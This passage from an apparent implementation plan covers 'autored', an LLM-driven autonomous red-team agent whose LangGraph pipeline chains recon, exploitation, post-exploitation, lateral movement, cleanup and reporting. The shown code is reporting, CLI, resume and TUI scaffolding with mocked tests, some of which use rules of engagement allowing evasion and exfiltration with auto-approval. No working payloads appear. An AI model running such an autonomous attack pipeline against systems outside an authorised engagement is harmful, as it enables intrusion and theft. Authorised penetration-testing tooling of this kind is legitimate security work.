        "engagement_summary": json.dumps(summary),
        "engagement_id": engagement_id,
    })
    if getattr(exec_output, "used_fallback", False):
        log.warning("report_exec_summary_fallback", engagement_id=engagement_id)

    # Step 3: technical report (narrative + deterministic sections, redacted)
    tech_data = {
        "summary": summary,
        "state": _redacted_state_dict(state),
    }
    tech_output = await techreportwriter_subagent.ainvoke({
        "engagement_data": json.dumps(tech_data),
        "engagement_id": engagement_id,
    })
    if getattr(tech_output, "used_fallback", False):
        log.warning("report_tech_report_fallback", engagement_id=engagement_id)

    # Step 4: assemble + write markdown FIRST (deliverable of record)
    markdown = assemble_markdown_report(
        state, exec_output.summary_markdown, tech_output.report_markdown, mitre_mappings,
    )
    report_dir = Path("engagements") / engagement_id
    report_dir.mkdir(parents=True, exist_ok=True)
    md_path = report_dir / "report.md"
    md_path.write_text(markdown)

    # Step 5: PDF (graceful degradation — Review Focus #5)
    pdf_path = await render_pdf(markdown, engagement_id)

    # Step 6: lessons for cross-engagement memory
    lessons_summary = {
        "footholds": summary["footholds"],
        "pivots": summary["pivots"],
        "unverified_cleanups": summary["unverified_cleanups"],
        "errors": summary["errors"],
    }
    lessons_output = await lessonextractor_subagent.ainvoke({
        "engagement_summary": json.dumps(lessons_summary),
        "engagement_id": engagement_id,
    })
    lessons = list(getattr(lessons_output, "lessons", []) or [])

    # Step 7: persist cross-engagement memory (SQLite + Chroma, isolated)
    try:
        from autored.persistence.chroma_store import ChromaStore
        chroma = ChromaStore()
    except Exception as e:  # noqa: BLE001 — chroma init failure degrades to None
        log.warning("report_chroma_unavailable", engagement_id=engagement_id, error=str(e))
        chroma = None
    memory_result = await persist_engagement_memory(state, chroma=chroma)
    if memory_result.db_error or memory_result.chroma_error:
        log.warning("report_memory_partial", engagement_id=engagement_id,
                    db_error=memory_result.db_error, chroma_error=memory_result.chroma_error)

    # Step 8: lessons.json (spec §3.2 layout)
    lessons_path = report_dir / "lessons.json"
    lessons_path.write_text(json.dumps(
        [lesson.model_dump() for lesson in lessons], indent=2,
    ))

    report_paths = ReportPaths(
        markdown_path=str(md_path),
        pdf_path=str(pdf_path) if pdf_path else None,
        lessons_path=str(lessons_path),
    )

    log.info("report_done", engagement_id=engagement_id,
             md=str(md_path), pdf=str(pdf_path), lessons=len(lessons))

    return {
        "phase": "done",
        "summary": summary["outcome"],
        "lessons": lessons,
        "mitre_mappings": mitre_mappings,
        "report_paths": report_paths,
        "iteration_count": state.iteration_count + 1,
    }
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `uv run pytest tests/unit/reporting/test_markdown_report.py tests/integration/test_report_agent.py -v`
Expected: PASS (6 tests)

- [ ] **Step 6: Commit**

```bash
git add autored/agents/report.py autored/reporting/markdown_report.py \
        tests/unit/reporting/test_markdown_report.py tests/integration/test_report_agent.py
git commit -m "feat: Report Agent node with 4 sub-agents, PDF, and memory persistence"
```

---

## Task 10: build_phase6_graph + CLI Switch + Full Pipeline Test

**Files:**
- Modify: `autored/graph.py` (add `build_phase6_graph`), `autored/cli.py` (switch `build_phase4_graph` → `build_phase6_graph`)
- Test: `tests/unit/test_graph.py` (MODIFY — append), `tests/integration/test_phase6_pipeline.py` (NEW)

**Interfaces:**
- Consumes: `report_node` (Task 9); every Phase 1–5 node.
- Produces: `build_phase6_graph(checkpointer)` — the full spec §2.3 topology at last: `roe_gate_start → recon → vuln → exploit → postex → lateral → cleanup → report → END`. The `report_phase1` stub is retired from the *active* graph (kept for the Phase 1–5 graph builders, which remain importable and tested — `autored resume` on old engagements still builds them).

- [ ] **Step 1: Write the failing tests**

Append to `tests/unit/test_graph.py`:

```python
# --- Phase 6 (Task 10) ---------------------------------------------------- #

def test_phase6_graph_contains_all_nodes():
    from autored.graph import build_phase6_graph

    nodes = _node_names(build_phase6_graph(checkpointer=None))
    for expected in (
        "roe_gate_start", "recon", "vuln", "exploit", "postex",
        "lateral", "cleanup", "report",
    ):
        assert expected in nodes, f"missing node: {expected}"
    assert "report_phase1" not in nodes  # stub retired from the active graph


def test_phase6_graph_full_chain_edges():
    from autored.graph import build_phase6_graph

    g = build_phase6_graph(checkpointer=None).get_graph()
    edges = {(e.source, e.target) for e in g.edges}
    for expected in (
        ("roe_gate_start", "recon"), ("recon", "vuln"), ("vuln", "exploit"),
        ("exploit", "postex"), ("postex", "lateral"), ("lateral", "cleanup"),
        ("cleanup", "report"),
    ):
        assert expected in edges, f"missing edge: {expected}"


def test_cli_uses_phase6_graph():
    """The CLI run command must build the Phase 6 graph."""
    source = Path("autored/cli.py").read_text()
    assert "build_phase6_graph" in source
    assert "build_phase4_graph" not in source
```

```python
# tests/integration/test_phase6_pipeline.py
"""Phase 6 full-pipeline integration test — the whole kill chain, mocked.

Built on test_phase5_pipeline.py's mock lattice (LLM per agent,
run_subprocess per recon tool, NVD httpx client, ChromaStore, exploit +
post-ex + lateral + cleanup sub-agents). Adds the report layer:
mitremapper / execsummarywriter / techreportwriter / lessonextractor
aliases, render_pdf, and persist_engagement_memory. Copy the ExitStack
lattice from the Phase 5 test verbatim, then append the patches below.

Asserts the Phase 6 ship criterion core: the graph terminates with
phase="done" AND the report deliverables exist.
"""
import shutil
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

# --- new patches appended to the Phase 5 ExitStack lattice --------------- #

# (inside the existing `with ExitStack() as stack:` block, after the
#  Phase 5 patches:)
#
#     report_layer = {
#         "autored.agents.report.mitremapper_subagent": _mitre_mock(),
#         "autored.agents.report.execsummarywriter_subagent": _exec_mock(),
#         "autored.agents.report.techreportwriter_subagent": _tech_mock(),
#         "autored.agents.report.lessonextractor_subagent": _lesson_mock(),
#         "autored.agents.report.render_pdf": AsyncMock(return_value=None),
#         "autored.agents.report.persist_engagement_memory": AsyncMock(
#             return_value=MagicMock(findings_written=1)),
#     }
#     for target, mock_obj in report_layer.items():
#         stack.enter_context(patch(target, mock_obj))


def _mitre_mock() -> MagicMock:
    from autored.models.report import MitreMapping

    mock = MagicMock()
    mock.ainvoke = AsyncMock(return_value=MagicMock(mappings=[MitreMapping(
        technique_id="T1210", technique_name="Exploitation of Remote Services",
        tactic="lateral-movement", source="foothold", detail="ms17_010",
    )]))
    return mock


def _exec_mock() -> MagicMock:
    mock = MagicMock()
    mock.ainvoke = AsyncMock(return_value=MagicMock(
        summary_markdown="## Executive Summary\n\nFull chain achieved.",
        used_fallback=False))
    return mock


def _tech_mock() -> MagicMock:
    mock = MagicMock()
    mock.ainvoke = AsyncMock(return_value=MagicMock(
        report_markdown="## Attack Narrative\n\nStory.\n\n## Scope\n\n- t",
        used_fallback=False))
    return mock


def _lesson_mock() -> MagicMock:
    from autored.models.report import Lesson

    mock = MagicMock()
    mock.ainvoke = AsyncMock(return_value=MagicMock(lessons=[
        Lesson(category="technique_worked", body="ms17_010 worked",
               mitre_technique_id="T1210"),
    ]))
    return mock


# The test body itself (replacing Phase 5's graph builder import):
#
#     from autored.graph import build_phase6_graph
#     ...
#     final_state = await graph.ainvoke(state, config=config)
#
#     assert final_state["phase"] == "done"            # Phase 6 closes the chain
#     assert final_state["report_paths"] is not None
#     report_md = Path(final_state["report_paths"].markdown_path)
#     lessons_json = Path(final_state["report_paths"].lessons_path)
#     assert report_md.exists() and report_md.stat().st_size > 0
#     assert lessons_json.exists()
#     assert len(final_state["lessons"]) >= 1
#     assert len(final_state["mitre_mappings"]) >= 1
#     assert final_state["summary"]
#     shutil.rmtree(Path("engagements") / engagement_id, ignore_errors=True)
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/test_graph.py -v`
Expected: FAIL with `ImportError: cannot import name 'build_phase6_graph'`

- [ ] **Step 3: Add the graph builder and switch the CLI**

Append to `autored/graph.py` (extend the imports at the top):

```python
from autored.agents.report import report_node
```

```python
def build_phase6_graph(checkpointer: AsyncSqliteSaver):
    """Build the full Phase 6 LangGraph — the complete spec §2.3 topology:

    ``roe_gate_start → recon → vuln → exploit → postex → lateral → cleanup → report → END``

    Phase 6 replaces the ``report_phase1`` stub with the real Report
    Agent: the full kill chain now ends in generated deliverables
    (report.md + report.pdf + lessons.json) and cross-engagement memory
    persistence. Topology stays linear — success/failure branching is
    handled inside the nodes (exploit exhaustion, lateral candidate
    loops, cleanup gate), exactly as in Phases 3–5, and HitL gates
    remain EventBus-based inside nodes rather than graph-level
    interrupts (documented spec §2.3 deviation carried since Phase 3).

    The Report Agent is full-auto (spec §2.4): no gate, no interrupt —
    every engagement gets its report, whatever the outcome.

    Args:
        checkpointer: a LangGraph checkpointer (typically an
            ``AsyncSqliteSaver``) enabling resume-after-crash semantics.

    Returns:
        A compiled ``StateGraph`` ready to ``.ainvoke(...)``.
    """
    graph = StateGraph(EngagementState)

    graph.add_node("roe_gate_start", roe_gate_node)
    graph.add_node("recon", recon_node)
    graph.add_node("vuln", vuln_node)
    graph.add_node("exploit", exploit_node)
    graph.add_node("postex", postex_node)
    graph.add_node("lateral", lateral_node)
    graph.add_node("cleanup", cleanup_node)
    graph.add_node("report", report_node)

    graph.set_entry_point("roe_gate_start")
    graph.add_edge("roe_gate_start", "recon")
    graph.add_edge("recon", "vuln")
    graph.add_edge("vuln", "exploit")
    graph.add_edge("exploit", "postex")
    graph.add_edge("postex", "lateral")
    graph.add_edge("lateral", "cleanup")
    graph.add_edge("cleanup", "report")
    graph.add_edge("report", END)

    return graph.compile(checkpointer=checkpointer)
```

(Imports for `lateral_node` / `cleanup_node` come from the Phase 5 additions — `from autored.agents.lateral import lateral_node` and `from autored.agents.cleanup import cleanup_node` — add them beside the existing agent imports.)

In `autored/cli.py`, change the import inside `run()`:

```python
    from autored.graph import build_phase6_graph
```

and the builder call:

```python
        graph = build_phase6_graph(checkpointer)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/test_graph.py tests/integration/test_phase6_pipeline.py -v`
Expected: PASS — Phase 5 graph tests unchanged, Phase 6 shape + pipeline green.

- [ ] **Step 5: Commit**

```bash
git add autored/graph.py autored/cli.py tests/unit/test_graph.py \
        tests/integration/test_phase6_pipeline.py
git commit -m "feat: build_phase6_graph closes the full kill chain with the Report Agent"
```

---

## Task 11: CLI Polish — `report` / `state` / Full `resume` / SQLite `engagements`

**Files:**
- Modify: `autored/cli.py`
- Test: `tests/unit/test_cli.py` (MODIFY — append)

**Interfaces:**
- Consumes: `report_node` (Task 9); `load_state_from_disk` / `save_state_to_disk` / `list_engagements` from `autored.persistence.filesystem`; `make_checkpointer` from `autored.persistence.sqlite_saver`; `build_phase6_graph` (Task 10); `list_engagements_with_findings` / `init_db` from `autored.persistence.engagement_db`; `register_roe` from `autored.roe_guard`.
- Produces (spec §14.1 commands, all previously stubs or missing):
  - `autored report <engagement_id>` — loads the saved state, runs the full report pipeline, merges the result back into the state, saves it, prints the deliverable paths. Missing state → clean error, exit code 1.
  - `autored state <engagement_id>` — Rich table of every state collection's count + phase + iteration + error count (spec §14.1 "Show engagement state").
  - `autored resume <engagement_id>` — **real resume** (the Phase 1 TODO finally paid): re-register RoE, wire a fresh EventBus, build the Phase 6 graph with the engagement's checkpointer, try checkpoint-resume (`ainvoke(None, config={"thread_id": ...})` — continues from the last persisted checkpoint), fall back to re-invoking with the loaded state when no checkpoint history exists. Saves the final state either way.
  - `autored engagements` — lists from `db/engagements.sqlite` when it has rows, falls back to the filesystem scan (spec §14.2: "... list from db/engagements.sqlite").
  - `_run_report_pipeline(engagement_id: str) -> dict` — shared helper (also used by Task 12's TUI report button path if ever needed).

- [ ] **Step 1: Write the failing tests**

Append to `tests/unit/test_cli.py`:

```python
# --- Phase 6 (Task 11): report / state / resume / engagements ------------- #

import json
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

from typer.testing import CliRunner

from autored.cli import app

runner = CliRunner()


def _write_state_file(tmp_path, engagement_id: str, phase: str = "postex") -> None:
    """Drop a minimal saved state on disk exactly like save_state_to_disk."""
    from autored.models.roe import RulesOfEngagement
    from autored.state import EngagementState

    roe = RulesOfEngagement(
        engagement_name="t", operator="t", operator_signature="t",
        allowed_ips=["*"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, data_destruction_allowed=False,
        kernel_exploits_allowed=True, hitl_mode="auto_approve",
    )
    state = EngagementState(
        engagement_id=engagement_id, target_scope=["10.0.0.5"],
        operator="t", rules_of_engagement=roe, phase=phase,
    )
    eng_dir = tmp_path / "engagements" / engagement_id
    eng_dir.mkdir(parents=True)
    (eng_dir / "state.json").write_text(state.model_dump_json())


def test_report_command_missing_state_exits_1(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    result = runner.invoke(app, ["report", "no-such-engagement"])
    assert result.exit_code == 1
    assert "No state found" in result.output


def test_report_command_runs_pipeline_and_prints_paths(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    _write_state_file(tmp_path, "cli-rep-e1", phase="cleanup")

    from autored.models.report import ReportPaths

    fake_result = {
        "phase": "done",
        "summary": "1 foothold",
        "lessons": [],
        "mitre_mappings": [],
        "report_paths": ReportPaths(
            markdown_path=str(tmp_path / "engagements/cli-rep-e1/report.md"),
            pdf_path=None,
            lessons_path=str(tmp_path / "engagements/cli-rep-e1/lessons.json"),
        ),
        "iteration_count": 1,
    }
    (tmp_path / "engagements/cli-rep-e1/report.md").write_text("# Report")
    (tmp_path / "engagements/cli-rep-e1/lessons.json").write_text("[]")

    with patch("autored.agents.report.report_node",
               AsyncMock(return_value=fake_result)):
        result = runner.invoke(app, ["report", "cli-rep-e1"])

    assert result.exit_code == 0
    assert "report.md" in result.output
    # The merged state was persisted back to disk with phase=done.
    saved = json.loads(
        (tmp_path / "engagements/cli-rep-e1/state.json").read_text())
    assert saved["phase"] == "done"


def test_state_command_prints_counts(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    _write_state_file(tmp_path, "cli-st-e1", phase="lateral")
    result = runner.invoke(app, ["state", "cli-st-e1"])
    assert result.exit_code == 0
    assert "cli-st-e1" in result.output
    assert "Phase" in result.output


def test_state_command_missing_state_exits_1(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    result = runner.invoke(app, ["state", "ghost"])
    assert result.exit_code == 1


def test_resume_command_checkpoint_path(tmp_path, monkeypatch):
    """Resume prefers LangGraph checkpoint continuation."""
    monkeypatch.chdir(tmp_path)
    _write_state_file(tmp_path, "cli-res-e1", phase="exploit")

    fake_graph = MagicMock()
    fake_graph.ainvoke = AsyncMock(return_value={"phase": "done"})
    fake_checkpointer = MagicMock()

    async def fake_make_checkpointer(engagement_id):
        return fake_checkpointer

    # NOTE: the resume command imports build_phase6_graph / make_checkpointer
    # inside the function body, so patches must target the SOURCE modules
    # (patching autored.cli.* would raise AttributeError — those attributes
    # never exist at module level).
    with patch("autored.graph.build_phase6_graph", return_value=fake_graph), \
         patch("autored.persistence.sqlite_saver.make_checkpointer",
               fake_make_checkpointer):
        result = runner.invoke(app, ["resume", "cli-res-e1"])

    assert result.exit_code == 0
    # Checkpoint resume = ainvoke(None, config with thread_id)
    call_args = fake_graph.ainvoke.await_args
    assert call_args.args[0] is None
    assert call_args.kwargs["config"]["configurable"]["thread_id"] == "cli-res-e1"


def test_resume_command_falls_back_to_saved_state(tmp_path, monkeypatch):
    """No checkpoint history → re-invoke with the loaded state."""
    monkeypatch.chdir(tmp_path)
    _write_state_file(tmp_path, "cli-res-e2", phase="exploit")

    fake_graph = MagicMock()

    async def _first_none_then_state(*args, **kwargs):
        if args and args[0] is None:
            raise RuntimeError("no checkpoint history")
        return {"phase": "done"}

    fake_graph.ainvoke = AsyncMock(side_effect=_first_none_then_state)

    async def fake_make_checkpointer(engagement_id):
        return MagicMock()

    # Function-local imports → patch the SOURCE modules (see note above).
    with patch("autored.graph.build_phase6_graph", return_value=fake_graph), \
         patch("autored.persistence.sqlite_saver.make_checkpointer",
               fake_make_checkpointer):
        result = runner.invoke(app, ["resume", "cli-res-e2"])

    assert result.exit_code == 0
    assert fake_graph.ainvoke.await_count == 2  # None first, then the state


def test_engagements_command_prefers_sqlite(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)

    async def fake_list(db_path):
        return [{
            "id": "db-e1", "target": "10.0.0.5", "phase": "done",
            "start_ts": "2026-09-22T10:00:00", "operator": "t",
            "summary": "x", "report_path": None, "end_ts": None,
            "parent_engagement_id": None,
        }]

    async def fake_init(db_path):
        return None

    # Function-local imports → patch the SOURCE modules.
    with patch("autored.persistence.engagement_db.init_db", fake_init), \
         patch("autored.persistence.engagement_db.list_engagements_with_findings",
               fake_list):
        result = runner.invoke(app, ["engagements"])

    assert result.exit_code == 0
    assert "db-e1" in result.output


def test_engagements_command_falls_back_to_filesystem(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)

    async def boom(db_path):
        raise RuntimeError("no db")

    def fake_fs_list():
        return [{"id": "fs-e1", "target": "10.0.0.9", "operator": "t",
                 "started_at": "2026-09-22"}]

    # Function-local imports → patch the SOURCE modules.
    with patch("autored.persistence.engagement_db.init_db",
               AsyncMock(side_effect=boom)), \
         patch("autored.persistence.filesystem.list_engagements", fake_fs_list):
        result = runner.invoke(app, ["engagements"])

    assert result.exit_code == 0
    assert "fs-e1" in result.output
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/test_cli.py -v`
Expected: FAIL — `report` / `state` commands don't exist (`No such command`), resume still a stub.

- [ ] **Step 3: Implement the commands**

In `autored/cli.py` — extend the module imports and replace the `resume` stub, add `report` / `state`, and rework `engagements`:

```python
@app.command()
def report(engagement_id: str):
    """Generate the report deliverables for a completed engagement.

    Runs the full Report Agent pipeline (exec summary, technical report,
    MITRE mapping, lessons, PDF when available) against the engagement's
    saved state and prints the deliverable paths.
    """
    import asyncio

    from autored.agents.report import report_node
    from autored.persistence.filesystem import load_state_from_disk
    from autored.roe_guard import register_roe

    console.print(f"[bold blue]Generating report:[/] {engagement_id}")
    state = load_state_from_disk(engagement_id)
    if state is None:
        console.print(f"[bold red]Error:[/] No state found for {engagement_id}")
        raise typer.Exit(code=1)

    register_roe(engagement_id, state.rules_of_engagement)

    async def _run():
        return await report_node(state)

    result = asyncio.run(_run())

    # Merge the report result back into the state and persist it.
    merged = state.model_dump()
    merged.update(result)
    from autored.state import EngagementState
    from autored.persistence.filesystem import save_state_to_disk
    save_state_to_disk(engagement_id, EngagementState.model_validate(merged))

    console.print(f"[bold green]Report complete:[/] {engagement_id}")
    console.print(f"  Markdown: {result['report_paths'].markdown_path}")
    console.print(
        f"  PDF: {result['report_paths'].pdf_path or '(unavailable — WeasyPrint/system libs missing)'}"
    )
    console.print(f"  Lessons: {result['report_paths'].lessons_path}")


@app.command()
def state(engagement_id: str):
    """Show an engagement's state summary (counts per collection)."""
    from autored.persistence.filesystem import load_state_from_disk

    loaded = load_state_from_disk(engagement_id)
    if loaded is None:
        console.print(f"[bold red]Error:[/] No state found for {engagement_id}")
        raise typer.Exit(code=1)

    table = Table(title=f"Engagement State — {engagement_id}")
    table.add_column("Field", style="cyan")
    table.add_column("Count / Value")
    table.add_row("Phase", loaded.phase)
    table.add_row("Iteration", str(loaded.iteration_count))
    table.add_row("Target", ", ".join(loaded.target_scope))
    table.add_row("Hosts", str(len(loaded.hosts)))
    table.add_row("Services", str(len(loaded.services)))
    table.add_row("Web apps", str(len(loaded.web_apps)))
    table.add_row("Vulnerabilities", str(len(loaded.vulnerabilities)))
    table.add_row("Attack hypotheses", str(len(loaded.attack_hypotheses)))
    table.add_row("Footholds", str(len(loaded.footholds)))
    table.add_row("Local users", str(len(loaded.local_users)))
    table.add_row("Harvested secrets", str(len(loaded.harvested_secrets)))
    table.add_row("Trust relationships", str(len(loaded.trust_relationships)))
    table.add_row("Privesc attempts", str(len(loaded.privesc_attempts)))
    table.add_row("Persistence artifacts", str(len(loaded.persistence_artifacts)))
    table.add_row("Evasion actions", str(len(loaded.evasion_actions)))
    table.add_row("Exfiltration proof", str(len(loaded.exfiltration_proof)))
    table.add_row("Pivots", str(len(getattr(loaded, "pivots", []))))
    table.add_row("Tunnels", str(len(getattr(loaded, "tunnels", []))))
    table.add_row("Sub-engagements", str(len(getattr(loaded, "sub_engagements", []))))
    table.add_row("Cleanup results", str(len(getattr(loaded, "cleanup_results", []))))
    table.add_row("Lessons", str(len(loaded.lessons)))
    table.add_row("MITRE mappings", str(len(loaded.mitre_mappings)))
    table.add_row("Errors", str(len(loaded.errors)))
    table.add_row("Evidence files", str(len(loaded.evidence_paths)))
    table.add_row("Summary", loaded.summary or "—")
    console.print(table)


@app.command()
def resume(engagement_id: str):
    """Resume an interrupted engagement from its last checkpoint.

    Prefers LangGraph checkpoint continuation (the engagement's own
    ``state.db``); falls back to re-invoking the graph with the saved
    ``state.json`` when no checkpoint history exists.
    """
    import asyncio

    from autored.persistence.filesystem import load_state_from_disk, save_state_to_disk
    from autored.persistence.sqlite_saver import make_checkpointer
    from autored.roe_guard import register_roe
    from autored.tui.event_bus import EventBus

    console.print(f"[bold yellow]Resuming engagement:[/] {engagement_id}")
    state = load_state_from_disk(engagement_id)
    if state is None:
        console.print(f"[bold red]Error:[/] No state found for {engagement_id}")
        raise typer.Exit(code=1)

    register_roe(engagement_id, state.rules_of_engagement)
    state.event_bus = EventBus()
    console.print(f"  Last phase: {state.phase}")
    console.print(f"  Iteration: {state.iteration_count}")

    from autored.graph import build_phase6_graph

    async def _run():
        checkpointer = await make_checkpointer(engagement_id)
        graph = build_phase6_graph(checkpointer)
        config = {"configurable": {"thread_id": engagement_id}}
        try:
            # Checkpoint resume: None input = continue from last checkpoint.
            return await graph.ainvoke(None, config=config)
        except Exception:
            # No checkpoint history — re-invoke from the saved state.
            return await graph.ainvoke(state, config=config)
        finally:
            conn = getattr(checkpointer, "conn", None)
            if conn is not None:
                await conn.close()

    try:
        final_state = asyncio.run(_run())
        if isinstance(final_state, dict):
            from autored.state import EngagementState
            final_state = EngagementState.model_validate(final_state)
        save_state_to_disk(engagement_id, final_state)
        console.print(f"[bold green]Engagement complete:[/] {engagement_id}")
        console.print(f"  Phase: {final_state.phase}")
    except KeyboardInterrupt:
        console.print(f"\n[yellow]Interrupted. Resume again with:[/] autored resume {engagement_id}")
        save_state_to_disk(engagement_id, state)


@app.command()
def engagements():
    """List all engagements (SQLite-backed, filesystem fallback)."""
    import asyncio

    from autored.persistence.engagement_db import (
        init_db,
        list_engagements_with_findings,
    )

    rows: list[dict] | None = None
    try:
        async def _list():
            await init_db("db/engagements.sqlite")
            return await list_engagements_with_findings("db/engagements.sqlite")

        rows = asyncio.run(_list())
    except Exception as e:  # noqa: BLE001 — fall back to the filesystem scan
        console.print(f"[dim](SQLite unavailable: {e} — listing from filesystem)[/]")

    table = Table(title="Engagements")
    table.add_column("ID", style="cyan")
    table.add_column("Target")
    table.add_column("Phase")
    table.add_column("Started")
    table.add_column("Operator")

    if rows:
        for eng in rows:
            table.add_row(
                eng["id"], eng["target"], eng["phase"],
                eng["start_ts"], eng["operator"],
            )
    else:
        from autored.persistence.filesystem import list_engagements
        for eng in list_engagements():
            table.add_row(
                eng["id"], eng["target"], eng.get("phase", "—"),
                eng["started_at"], eng["operator"],
            )
    console.print(table)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/test_cli.py -v`
Expected: PASS — new command tests green, existing CLI tests unchanged.

- [ ] **Step 5: Commit**

```bash
git add autored/cli.py tests/unit/test_cli.py
git commit -m "feat: CLI report/state/resume/engagements commands (spec §14.1)"
```

---

## Task 12: TUI Launch Integration — `--tui` Runs the Real App + Orchestrator

**Files:**
- Modify: `autored/tui/app.py`, `autored/cli.py`
- Test: `tests/unit/tui/test_app_launch.py` (NEW)

**Interfaces:**
- Consumes: `DashboardScreen(engagement_id, event_bus)` (Phase 3, unchanged); `EventBus` (unchanged); `build_phase6_graph` (Task 10); `make_checkpointer`; `load_state_from_disk` / `save_state_to_disk` / `init_engagement_folder`; `register_roe`; `load_roe`; `generate_engagement_id`.
- Produces:
  - `RunConfig(target: str, roe_path: str, engagement_id: str, operator: str)` — dataclass in `autored/tui/app.py`; a fresh engagement the in-app orchestrator will run.
  - `AutoRedApp(engagement_id: str | None = None, run_config: RunConfig | None = None)` with:
    - `self.current_state: EngagementState | None` — loaded/updated by the orchestrator; consumed by the Phase 6 screens (Tasks 14–16).
    - `self.orchestrator_task: asyncio.Task | None` — the background LangGraph run.
    - `async def _run_orchestrator(self, state) -> None` — registers RoE, wires `state.event_bus = self.event_bus`, builds the Phase 6 graph with the engagement checkpointer, `ainvoke`s, emits `{"type": "phase_change", "new_phase": "done"}` on the bus, saves the final state to disk, and stores it on `self.current_state`. Closes the checkpointer connection in `finally`.
    - `async def _start_orchestrator(self, state) -> None` — `asyncio.create_task(self._run_orchestrator(state))`, stored on `self.orchestrator_task`.
    - `async def open_engagement(self, engagement_id: str, resume: bool = False) -> None` — loads the saved state (view mode), sets `self.current_state`, pushes `DashboardScreen`; when `resume=True`, also starts the orchestrator from the loaded state.
    - `async def action_quit(self) -> None` — cancels a running orchestrator task before exiting.
  - CLI `run --tui` branch replaced: builds the `RunConfig`, prints the banner, and calls `AutoRedApp(engagement_id=..., run_config=...).run()` (blocking — the orchestrator runs as an asyncio task inside the app's loop; spec §14.2: "Orchestrator runs in background thread/task").
  - `on_mount` behavior: `run_config` set → build the fresh state and start the orchestrator + dashboard; `engagement_id` only → `open_engagement(engagement_id)` (view/resume mode); neither → `EngagementListScreen` (Task 13 registers it; until then the Phase 3 "none" dashboard placeholder stays).

**Design note — why the orchestrator is an asyncio task inside the app (not a thread):** Textual runs its own asyncio loop; `app.run_test()` gives tests a Pilot on that same loop. A background task on the app loop lets the pilot `await app.orchestrator_task` directly in tests (deterministic completion) and shares the EventBus queues without cross-thread synchronization. The spec's "background thread/task" phrasing permits either.

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/tui/test_app_launch.py
"""TUI launch integration tests (Phase 6 Task 12).

Spec §14.2: --tui launches the dashboard with the orchestrator running
as a background task; the EventBus carries events between them.
"""
from dataclasses import dataclass
from unittest.mock import AsyncMock, MagicMock, patch

from autored.models.roe import RulesOfEngagement
from autored.state import EngagementState
from autored.tui.app import AutoRedApp, RunConfig
from autored.tui.screens.dashboard import DashboardScreen


def _roe() -> RulesOfEngagement:
    return RulesOfEngagement(
        engagement_name="t", operator="t", operator_signature="t",
        allowed_ips=["*"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, data_destruction_allowed=False,
        kernel_exploits_allowed=True, hitl_mode="auto_approve",
    )


def _final_state_dict() -> dict:
    state = EngagementState(
        engagement_id="tui-e1", target_scope=["10.0.0.5"],
        operator="t", rules_of_engagement=_roe(), phase="done",
    )
    return state.model_dump()


async def test_run_config_starts_orchestrator_and_dashboard(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    fake_graph = MagicMock()
    fake_graph.ainvoke = AsyncMock(return_value=_final_state_dict())

    async def fake_make_checkpointer(engagement_id):
        cp = MagicMock()
        cp.conn = None  # skip the close branch
        return cp

    async def fake_load_roe(path):
        return _roe()

    # The app's orchestrator imports everything INSIDE method bodies, so
    # patches must target the SOURCE modules (autored.graph.*, etc.) —
    # patching autored.tui.app.* would raise AttributeError.
    with patch("autored.graph.build_phase6_graph", return_value=fake_graph), \
         patch("autored.persistence.sqlite_saver.make_checkpointer",
               fake_make_checkpointer), \
         patch("autored.config.load_roe", fake_load_roe), \
         patch("autored.persistence.filesystem.init_engagement_folder",
               MagicMock()), \
         patch("autored.roe_guard.register_roe", MagicMock()), \
         patch("autored.persistence.filesystem.save_state_to_disk", MagicMock()):
        app = AutoRedApp(run_config=RunConfig(
            target="10.0.0.5", roe_path="roe-sandbox.yaml",
            engagement_id="tui-e1", operator="t",
        ))
        async with app.run_test() as pilot:
            assert isinstance(app.screen, DashboardScreen)
            assert app.orchestrator_task is not None
            await app.orchestrator_task  # deterministic: everything is mocked

    assert app.current_state is not None
    assert app.current_state.phase == "done"
    fake_graph.ainvoke.assert_awaited_once()
    # The orchestrator emitted the completion event on the bus.
    event = app.event_bus.try_get_tui_event()
    assert event is not None
    assert event["type"] == "phase_change"
    assert event["new_phase"] == "done"


async def test_open_engagement_views_saved_state(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    eng_dir = tmp_path / "engagements" / "tui-view-e1"
    eng_dir.mkdir(parents=True)
    state = EngagementState(
        engagement_id="tui-view-e1", target_scope=["10.0.0.5"],
        operator="t", rules_of_engagement=_roe(), phase="lateral",
    )
    (eng_dir / "state.json").write_text(state.model_dump_json())

    app = AutoRedApp(engagement_id="tui-view-e1")
    async with app.run_test() as pilot:
        await pilot.pause()
        assert app.current_state is not None
        assert app.current_state.phase == "lateral"
        assert isinstance(app.screen, DashboardScreen)
        assert app.orchestrator_task is None  # view mode — nothing running


async def test_orchestrator_failure_is_surfaced_not_fatal(tmp_path, monkeypatch):
    """A crashed orchestrator must not kill the TUI."""
    monkeypatch.chdir(tmp_path)
    fake_graph = MagicMock()
    fake_graph.ainvoke = AsyncMock(side_effect=RuntimeError("graph exploded"))

    async def fake_make_checkpointer(engagement_id):
        cp = MagicMock()
        cp.conn = None
        return cp

    async def fake_load_roe(path):
        return _roe()

    with patch("autored.graph.build_phase6_graph", return_value=fake_graph), \
         patch("autored.persistence.sqlite_saver.make_checkpointer",
               fake_make_checkpointer), \
         patch("autored.config.load_roe", fake_load_roe), \
         patch("autored.persistence.filesystem.init_engagement_folder",
               MagicMock()), \
         patch("autored.roe_guard.register_roe", MagicMock()), \
         patch("autored.persistence.filesystem.save_state_to_disk", MagicMock()):
        app = AutoRedApp(run_config=RunConfig(
            target="10.0.0.5", roe_path="roe.yaml",
